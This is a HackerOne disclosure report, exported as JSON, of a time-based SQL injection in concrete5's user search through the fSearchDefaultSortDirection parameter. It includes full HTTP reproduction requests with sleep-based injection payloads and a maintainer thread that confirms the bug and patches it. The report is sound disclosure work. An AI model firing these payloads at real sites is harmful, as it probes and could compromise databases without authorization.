{"id":876800,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzY4MDA=","url":"https://hackerone.com/reports/876800","title":"Time-base SQL Injection in Search Users","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-18T02:09:34.023Z","submitted_at":"2020-05-18T02:09:34.023Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"thiennv","url":"/thiennv","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concrete5","handle":"concrete5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"concrete5","twitter_handle":"concrete5","website":"https://www.concrete5.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-05T01:08:55.415Z","bug_reporter_agreed_on_going_public_at":"2020-07-06T01:08:23.214Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n=====================\nI've identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint **/index.php/dashboard/users/search** and can be exploited via the **fSearchDefaultSortDirection** param.\n\nI didn't extract any data from the database, I've confirmed the vulnerability using sleep SQL queries with various arithmetic operations. The sleep command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.\n\nFor example, setting the value ==fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)== will cause the server to sleep for ==30== seconds or setting the value ==fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)== will cause the server to sleep for ==20== seconds.\n\nTo reproduce\n=====================\nSend the following HTTP request (With sleep=20s):\n---------------------\n```\nPOST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 399\nConnection: close\n\nfield%5B%5D=keywords\u0026keywords=admin\u0026field%5B%5D=is_active\u0026active=0\u0026u.uName=1\u0026u.uEmail=1\u0026u.uDateAdded=1\u0026uStatus=1\u0026u.uNumLogins=1\u0026column%5B%5D=u.uName\u0026column%5B%5D=u.uEmail\u0026column%5B%5D=u.uDateAdded\u0026column%5B%5D=uStatus\u0026column%5B%5D=u.uNumLogins\u0026fSearchDefaultSort=u.uDateAdded\u0026fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)\u0026fSearchItemsPerPage=10\u0026__ccm_consider_request_as_xhr=1\n```\nResult: Server to sleep for 20 seconds\n---------------------\nF832170\n\nSend the following HTTP request (With sleep=30s):\n---------------------\n```\nPOST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 399\nConnection: close\n\nfield%5B%5D=keywords\u0026keywords=admin\u0026field%5B%5D=is_active\u0026active=0\u0026u.uName=1\u0026u.uEmail=1\u0026u.uDateAdded=1\u0026uStatus=1\u0026u.uNumLogins=1\u0026column%5B%5D=u.uName\u0026column%5B%5D=u.uEmail\u0026column%5B%5D=u.uDateAdded\u0026column%5B%5D=uStatus\u0026column%5B%5D=u.uNumLogins\u0026fSearchDefaultSort=u.uDateAdded\u0026fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)\u0026fSearchItemsPerPage=10\u0026__ccm_consider_request_as_xhr=1\n```\nResult: Server to sleep for 30 seconds\n---------------------\nF832171\n\n## Impact\n\nAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database or extract sensitive information","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;ve identified an SQL injection vulnerability in the website labs.data.gov that affects the endpoint \u003cstrong\u003e/index.php/dashboard/users/search\u003c/strong\u003e and can be exploited via the \u003cstrong\u003efSearchDefaultSortDirection\u003c/strong\u003e param.\u003c/p\u003e\n\n\u003cp\u003eI didn\u0026#39;t extract any data from the database, I\u0026#39;ve confirmed the vulnerability using sleep SQL queries with various arithmetic operations. The sleep command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.\u003c/p\u003e\n\n\u003cp\u003eFor example, setting the value \u003cmark\u003efSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)\u003c/mark\u003e will cause the server to sleep for \u003cmark\u003e30\u003c/mark\u003e seconds or setting the value \u003cmark\u003efSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)\u003c/mark\u003e will cause the server to sleep for \u003cmark\u003e20\u003c/mark\u003e seconds.\u003c/p\u003e\n\n\u003ch1 id=\"to-reproduce\"\u003eTo reproduce\u003c/h1\u003e\n\n\u003ch2 id=\"send-the-following-http-request-with-sleep-20s\"\u003eSend the following HTTP request (With sleep=20s):\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 399\nConnection: close\n\nfield%5B%5D=keywords\u0026amp;keywords=admin\u0026amp;field%5B%5D=is_active\u0026amp;active=0\u0026amp;u.uName=1\u0026amp;u.uEmail=1\u0026amp;u.uDateAdded=1\u0026amp;uStatus=1\u0026amp;u.uNumLogins=1\u0026amp;column%5B%5D=u.uName\u0026amp;column%5B%5D=u.uEmail\u0026amp;column%5B%5D=u.uDateAdded\u0026amp;column%5B%5D=uStatus\u0026amp;column%5B%5D=u.uNumLogins\u0026amp;fSearchDefaultSort=u.uDateAdded\u0026amp;fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)\u0026amp;fSearchItemsPerPage=10\u0026amp;__ccm_consider_request_as_xhr=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"result-server-to-sleep-for-20-seconds\"\u003eResult: Server to sleep for 20 seconds\u003c/h2\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"Time-base_SQLi_20s.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UVUbugFmkkw5XQM9HFrgPPbu?response-content-disposition=attachment%3B%20filename%3D%22Time-base_SQLi_20s.png%22%3B%20filename%2A%3DUTF-8%27%27Time-base_SQLi_20s.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070440Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=a24a17f36defce38d95d220ae691eeefd4fef323df35d6969d43bfd3d961d513\" data-attachment-type=\"image/png\"\u003eTime-base_SQLi_20s.png (F832170)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"send-the-following-http-request-with-sleep-30s\"\u003eSend the following HTTP request (With sleep=30s):\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 399\nConnection: close\n\nfield%5B%5D=keywords\u0026amp;keywords=admin\u0026amp;field%5B%5D=is_active\u0026amp;active=0\u0026amp;u.uName=1\u0026amp;u.uEmail=1\u0026amp;u.uDateAdded=1\u0026amp;uStatus=1\u0026amp;u.uNumLogins=1\u0026amp;column%5B%5D=u.uName\u0026amp;column%5B%5D=u.uEmail\u0026amp;column%5B%5D=u.uDateAdded\u0026amp;column%5B%5D=uStatus\u0026amp;column%5B%5D=u.uNumLogins\u0026amp;fSearchDefaultSort=u.uDateAdded\u0026amp;fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)\u0026amp;fSearchItemsPerPage=10\u0026amp;__ccm_consider_request_as_xhr=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"result-server-to-sleep-for-30-seconds\"\u003eResult: Server to sleep for 30 seconds\u003c/h2\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"Time-base_SQLi_30s.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vNffqXj4cimgNrvUcxYbFDj7?response-content-disposition=attachment%3B%20filename%3D%22Time-base_SQLi_30s.png%22%3B%20filename%2A%3DUTF-8%27%27Time-base_SQLi_30s.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070440Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=084c8a11fca8e71e9c4817198b6a658a7617367f116229cbefaf5ff08464490e\" data-attachment-type=\"image/png\"\u003eTime-base_SQLi_30s.png (F832171)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database or extract sensitive information\u003c/p\u003e\n","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":832170,"file_name":"Time-base_SQLi_20s.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UVUbugFmkkw5XQM9HFrgPPbu?response-content-disposition=attachment%3B%20filename%3D%22Time-base_SQLi_20s.png%22%3B%20filename%2A%3DUTF-8%27%27Time-base_SQLi_20s.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070440Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026X-Amz-Signature=a24a17f36defce38d95d220ae691eeefd4fef323df35d6969d43bfd3d961d513","file_size":113699,"type":"image/png"},{"id":832171,"file_name":"Time-base_SQLi_30s.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vNffqXj4cimgNrvUcxYbFDj7?response-content-disposition=attachment%3B%20filename%3D%22Time-base_SQLi_30s.png%22%3B%20filename%2A%3DUTF-8%27%27Time-base_SQLi_30s.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070440Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026X-Amz-Signature=084c8a11fca8e71e9c4817198b6a658a7617367f116229cbefaf5ff08464490e","file_size":113297,"type":"image/png"}],"allow_singular_disclosure_at":"2020-08-05T01:08:23.320Z","allow_singular_disclosure_after":-12635777.333327672,"singular_disclosure_allowed":true,"vote_count":54,"voters":["foobar7","bl4de","sudi","khizer47","f_m","mightyowl","tandav","sa1tama0","eabesh","sim4n6","and 44 more..."],"severity":{"rating":"medium","score":5.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":13099,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/concrete5/concrete5","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8029506,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"**This report has been automatically set to \"needs more info\"** because it does not adhere to the rules listed [on our project page](https://hackerone.com/concrete5). Please go over these rules and resubmit following the directions.\r\n\r\nIf you've read and complied with all of the rules, please email security@concrete5.org so that this issue may be reopened.","markdown_message":"\u003cp\u003e\u003cstrong\u003eThis report has been automatically set to \u0026quot;needs more info\u0026quot;\u003c/strong\u003e because it does not adhere to the rules listed \u003ca href=\"https://hackerone.com/concrete5\"\u003eon our project page\u003c/a\u003e. Please go over these rules and resubmit following the directions.\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;ve read and complied with all of the rules, please email \u003ca title=\"security@concrete5.org\" href=\"mailto:security@concrete5.org\" rel=\"nofollow noopener noreferrer\"\u003esecurity@concrete5.org\u003c/a\u003e so that this issue may be reopened.\u003c/p\u003e\n","automated_response":true,"created_at":"2020-05-18T02:09:34.990Z","updated_at":"2020-05-18T02:09:34.990Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8029520,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\nHi, I'm crayons","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nHi, I\u0026#39;m crayons\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T02:16:00.859Z","updated_at":"2020-05-18T02:16:00.859Z","actor":{"username":"thiennv","cleared":false,"url":"/thiennv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TXFhU3KsSqT9D2gPDMxax4HJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037271,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @thiennv,\nThanks for this report, I'll take a look this morning and get back to you.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/thiennv\"\u003e@thiennv\u003c/a\u003e,\u003cbr\u003e\nThanks for this report, I\u0026#39;ll take a look this morning and get back to you.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T15:15:48.567Z","updated_at":"2020-05-18T15:15:48.567Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8037333,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-18T15:23:25.344Z","updated_at":"2020-05-18T15:23:25.344Z","additional_data":{"old_severity":"High","new_severity":"Medium (5.5)","old_severity_id":724733,"new_severity_id":725246},"actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8038092,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @thiennv,\nI've been able to confirm that this is valid, we should definitely be sanitizing this direction parameter. It does appear that we are checking permissions so thankfully this is not accessible without an administrator account, can you confirm that?\n\nIn the meantime I've submitted a pull request that should resolve this issue: https://github.com/concrete5/concrete5/pull/8651 Can you verify that this patch fixes things?\n\nThanks,\nKorvin","markdown_message":"\u003cp\u003eHi \u003ca href=\"/thiennv\"\u003e@thiennv\u003c/a\u003e,\u003cbr\u003e\nI\u0026#39;ve been able to confirm that this is valid, we should definitely be sanitizing this direction parameter. It does appear that we are checking permissions so thankfully this is not accessible without an administrator account, can you confirm that?\u003c/p\u003e\n\n\u003cp\u003eIn the meantime I\u0026#39;ve submitted a pull request that should resolve this issue: \u003ca title=\"https://github.com/concrete5/concrete5/pull/8651\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fpull%2F8651\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5/pull/8651\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e Can you verify that this patch fixes things?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nKorvin\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T15:51:01.302Z","updated_at":"2020-05-18T15:51:01.302Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8042889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@korvin I confirmed that the issue is fixed by https://github.com/concrete5/concrete5/pull/8651 pull request! I agree that only admin can do this action!","markdown_message":"\u003cp\u003e\u003ca href=\"/korvin\"\u003e@korvin\u003c/a\u003e I confirmed that the issue is fixed by \u003ca title=\"https://github.com/concrete5/concrete5/pull/8651\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fpull%2F8651\" target=\"_blank\" rel=\"nofollow noopener 